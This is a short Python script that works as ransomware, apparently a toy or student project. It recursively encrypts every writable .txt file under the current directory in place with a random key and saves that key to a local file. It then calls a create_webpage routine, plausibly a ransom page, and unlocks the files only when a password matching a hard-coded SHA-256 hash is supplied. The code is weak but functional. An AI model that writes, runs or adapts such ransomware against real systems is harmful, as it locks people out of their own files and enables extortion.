#!/usr/bin/python
import tempfile, argparse
import os, sys, random, hashlib
from pathlib import *
from encrypt import encrypt_line, save_key
from decrypt import decrypt_line, find_key
from webpage import create_webpage

def hash(text):
    result = hashlib.sha256(text.encode())

    # Only achieved if the correct private key entered
    if result.hexdigest() == "4c8708f6067eff3b8e8668b8d18e93cd88df5ffd97d01bdc9690ecac9bf9297a":
        return True
    else:
        return False

def walk(input_path, key, action):
    p = Path(input_path)
    if (p.exists()):
        for file in p.rglob('*.txt'):
            if (os.access(file, os.W_OK) and os.access(file, os.R_OK)):
                try:
                    t = tempfile.NamedTemporaryFile(mode="r+")

                    with open(file, mode='r', encoding="utf8") as f:
                        for line in f:
                            if (action):
                                new_line = encrypt_line(line, key)
                            else:
                                new_line = decrypt_line(line, key)
                            t.write(new_line)

                    t.seek(0)

                    with open(file, mode='w', encoding="utf8") as f:
                        for line in t:
                            f.write(line)

                    t.close()

                    # saving the key in .key file
                    if action:
                        save_key(key)

                except IOError as e:
                    print(str(file) + " raises exception:\n" + e)
            else:
                print(str(file) + " does not have correct permissions")

if __name__ == "__main__":

    parser = argparse.ArgumentParser(description="Enter the private key:")
    parser.add_argument('-d', type=str, dest='decrypt', default="")
    results = parser.parse_args()

    if hash(results.decrypt):
        key = find_key('.')
        if key is not None:
            walk('.', key, False)
    elif (not hash(results.decrypt)) and (results.decrypt != ""):
        print("Entered wrong key\nExiting....")
    else:
        key = random.randint(1, 127)
        walk('.', key, True)
        create_webpage()






